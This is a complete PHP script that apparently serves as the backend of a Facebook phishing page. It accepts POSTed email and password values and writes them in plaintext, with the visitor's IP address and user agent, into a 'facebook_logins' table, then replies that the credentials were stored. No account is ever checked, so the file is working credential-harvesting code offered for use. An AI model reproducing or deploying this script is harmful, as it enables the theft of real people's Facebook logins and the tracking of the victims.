<?php
header('Content-Type: application/json');

// Enable error reporting for debugging (disable in production)
error_reporting(E_ALL);
ini_set('display_errors', 0); // Set to 0 for production, 1 for testing

// ========== DATABASE CONFIGURATION ==========
// Update these values with your phpMyAdmin database credentials
$host = 'localhost';           // Usually 'localhost' for local server
$dbname = 'facebook_auth_db';  // Your database name
$username_db = 'root';         // Your MySQL username (default 'root' for XAMPP/WAMP)
$password_db = '';             // Your MySQL password (empty for XAMPP default)

// ========== CREATE CONNECTION ==========
$conn = new mysqli($host, $username_db, $password_db, $dbname);

// Check connection
if ($conn->connect_error) {
    echo json_encode([
        'status' => 'error', 
        'message' => 'Database connection failed: ' . $conn->connect_error
    ]);
    exit;
}

// Set charset to UTF-8 for proper text handling
$conn->set_charset("utf8mb4");

// ========== PROCESS POST REQUEST ==========
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    
    // Get and sanitize input data
    $email = isset($_POST['email']) ? trim($_POST['email']) : '';
    $password = isset($_POST['password']) ? trim($_POST['password']) : '';
    
    // Validate input
    if (empty($email) || empty($password)) {
        echo json_encode([
            'status' => 'error', 
            'message' => 'Email and password cannot be empty.'
        ]);
        exit;
    }
    
    // Get IP address and user agent for additional tracking
    $ip_address = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
    
    // Prepare and execute INSERT statement
    $stmt = $conn->prepare("INSERT INTO facebook_logins (email, password, ip_address, user_agent) VALUES (?, ?, ?, ?)");
    if (!$stmt) {
        echo json_encode([
            'status' => 'error', 
            'message' => 'Database prepare failed: ' . $conn->error
        ]);
        exit;
    }
    
    $stmt->bind_param("ssss", $email, $password, $ip_address, $user_agent);
    
    if ($stmt->execute()) {
        echo json_encode([
            'status' => 'success', 
            'message' => 'Credentials stored successfully.'
        ]);
    } else {
        echo json_encode([
            'status' => 'error', 
            'message' => 'Failed to save credentials: ' . $stmt->error
        ]);
    }
    
    $stmt->close();
    
} else {
    // Handle non-POST requests
    echo json_encode([
        'status' => 'error', 
        'message' => 'Invalid request method. Please use POST.'
    ]);
}

// Close database connection
$conn->close();
?>